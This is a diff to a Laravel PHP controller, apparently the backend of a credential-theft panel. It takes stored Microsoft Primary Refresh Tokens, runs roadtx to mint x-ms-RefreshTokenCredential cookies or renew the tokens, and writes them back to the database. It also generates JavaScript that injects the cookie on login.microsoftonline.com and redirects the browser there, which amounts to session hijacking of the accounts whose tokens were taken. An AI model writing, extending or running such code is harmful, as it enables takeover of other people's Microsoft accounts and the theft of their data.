@@ -96,110 +96,193 @@ class CommandController extends Controller
     }
 
     public function cookie($id)
-{
-    $token = Token::findOrFail($id);
+    {
+        $token = Token::findOrFail($id);
 
-    if (!$token->prt) {
-        return response()->json([
-            'error' => 'PRT not found'
-        ], 400);
-    }
-
-    // =========================
-    // 📁 TEMP FILE
-    // =========================
-    $tmpDir = storage_path('app/prt_tmp');
-
-    if (!File::exists($tmpDir)) {
-        File::makeDirectory($tmpDir, 0777, true);
-    }
-
-    $file = $tmpDir . '/' . Str::uuid() . '.prt';
-
-    // 🔥 simpan PRT ke file
-    File::put($file, $token->prt);
-
-    try {
-
-        // =========================
-        // 🚀 RUN ROADTX (FIXED)
-        // =========================
-        $process = new Process([
-            '/var/www/stepholder/venv/bin/roadtx',
-            'prtcookie',
-            '--prt-file',
-            $file
-        ]);
-
-        // 🔥 penting banget
-        $process->setWorkingDirectory(dirname($file));
-
-        $process->setTimeout(30);
-        $process->run();
-
-        // =========================
-        // 🔍 DEBUG LOG (WAJIB)
-        // =========================
-        \Log::info('[PRT COOKIE DEBUG]', [
-            'cmd' => $process->getCommandLine(),
-            'stdout' => $process->getOutput(),
-            'stderr' => $process->getErrorOutput(),
-            'exit_code' => $process->getExitCode()
-        ]);
-
-        if (!$process->isSuccessful()) {
-            throw new \Exception(
-                $process->getErrorOutput() ?: $process->getOutput()
-            );
+        if (!$token->prt) {
+            return response()->json([
+                'error' => 'PRT not found'
+            ], 400);
         }
 
-        $output = $process->getOutput();
+        // =========================
+        // 📁 TEMP FILE
+        // =========================
+        $tmpDir = storage_path('app/prt_tmp');
 
-        // =========================
-        // 🔥 EXTRACT COOKIE
-        // =========================
-        if (!preg_match('/PRT cookie:\s*(\S+)/', $output, $match)) {
-            throw new \Exception("PRT cookie not found. Output: " . $output);
+        if (!File::exists($tmpDir)) {
+            File::makeDirectory($tmpDir, 0777, true);
         }
 
-        $cookie = $match[1];
+        $file = $tmpDir . '/' . Str::uuid() . '.prt';
 
-        // =========================
-        // 🔥 BUILD JS SCRIPT
-        // =========================
-        $script = <<<JS
-// Inject PRT Cookie
+        // 🔥 simpan PRT ke file
+        File::put($file, $token->prt);
+
+        try {
+
+            // =========================
+            // 🚀 RUN ROADTX (FIXED)
+            // =========================
+            $process = new Process([
+                '/var/www/stepholder/venv/bin/roadtx',
+                'prtcookie',
+                '--prt-file',
+                $file
+            ]);
+
+            // 🔥 penting banget
+            $process->setWorkingDirectory(dirname($file));
+
+            $process->setTimeout(30);
+            $process->run();
+
+            // =========================
+            // 🔍 DEBUG LOG (WAJIB)
+            // =========================
+            \Log::info('[PRT COOKIE DEBUG]', [
+                'cmd' => $process->getCommandLine(),
+                'stdout' => $process->getOutput(),
+                'stderr' => $process->getErrorOutput(),
+                'exit_code' => $process->getExitCode()
+            ]);
+
+            if (!$process->isSuccessful()) {
+                throw new \Exception(
+                    $process->getErrorOutput() ?: $process->getOutput()
+                );
+            }
+
+            $output = $process->getOutput();
+
+            // =========================
+            // 🔥 EXTRACT COOKIE
+            // =========================
+            if (!preg_match('/PRT cookie:\s*(\S+)/', $output, $match)) {
+                throw new \Exception("PRT cookie not found. Output: " . $output);
+            }
+
+            $cookie = $match[1];
+
+            // =========================
+            // 🔥 BUILD JS SCRIPT
+            // =========================
+            $script = <<<JS
 document.cookie = "x-ms-RefreshTokenCredential={$cookie}; domain=.login.microsoftonline.com; path=/; secure; samesite=none";
-
 // Redirect after 3s
 setTimeout(() => {
   window.location.href = "https://login.microsoftonline.com/?auth=2";
 }, 3000);
 JS;
 
-        return response()->json([
-            'script' => $script
-        ]);
+            return response()->json([
+                'script' => $script
+            ]);
 
-    } catch (\Throwable $e) {
+        } catch (\Throwable $e) {
 
-        \Log::error('[PRT COOKIE ERROR]', [
-            'error' => $e->getMessage()
-        ]);
+            \Log::error('[PRT COOKIE ERROR]', [
+                'error' => $e->getMessage()
+            ]);
 
-        return response()->json([
-            'error' => 'Failed generate cookie',
-            'message' => $e->getMessage() // 🔥 biar debug gampang
-        ], 500);
+            return response()->json([
+                'error' => 'Failed generate cookie',
+                'message' => $e->getMessage() // 🔥 biar debug gampang
+            ], 500);
 
-    } finally {
+        } finally {
 
-        // =========================
-        // 🧹 CLEANUP
-        // =========================
-        if (File::exists($file)) {
-            File::delete($file);
+            // =========================
+            // 🧹 CLEANUP
+            // =========================
+            if (File::exists($file)) {
+                File::delete($file);
+            }
         }
     }
-}
+
+    public function renew($id)
+    {
+        $token = Token::findOrFail($id);
+
+        if (!$token->prt) {
+            return response()->json([
+                'error' => 'PRT not found'
+            ], 400);
+        }
+
+        $tmpDir = storage_path('app/prt_tmp');
+
+        if (!File::exists($tmpDir)) {
+            File::makeDirectory($tmpDir, 0777, true);
+        }
+
+        $file = $tmpDir . '/' . Str::uuid() . '.prt';
+
+        // 🔥 tulis PRT JSON dari DB ke file
+        File::put($file, $token->prt);
+
+        try {
+
+            // 🚀 RUN RENEW
+            $process = new Process([
+                '/var/www/stepholder/venv/bin/roadtx',
+                'prt',
+                '-a',
+                'renew',
+                '--prt-file',
+                $file
+            ]);
+
+            $process->setWorkingDirectory(dirname($file));
+            $process->setTimeout(30);
+            $process->run();
+
+            \Log::info('[PRT RENEW DEBUG]', [
+                'cmd' => $process->getCommandLine(),
+                'stdout' => $process->getOutput(),
+                'stderr' => $process->getErrorOutput(),
+                'exit_code' => $process->getExitCode()
+            ]);
+
+            if (!$process->isSuccessful()) {
+                throw new \Exception(
+                    $process->getErrorOutput() ?: $process->getOutput()
+                );
+            }
+
+            $output = $process->getOutput();
+
+            // 🔥 ambil JSON baru dari file (roadtx overwrite file)
+            $newPrt = File::get($file);
+
+            // ✅ update database
+            $token->prt = $newPrt;
+            $token->save();
+
+            return response()->json([
+                'message' => 'PRT renewed successfully',
+                'prt' => json_decode($newPrt, true)
+            ]);
+
+        } catch (\Throwable $e) {
+
+            \Log::error('[PRT RENEW ERROR]', [
+                'error' => $e->getMessage()
+            ]);
+
+            return response()->json([
+                'error' => 'Failed renew PRT',
+                'message' => $e->getMessage()
+            ], 500);
+
+        } finally {
+
+            if (File::exists($file)) {
+                File::delete($file);
+            }
+        }
+    }
+
+
 }
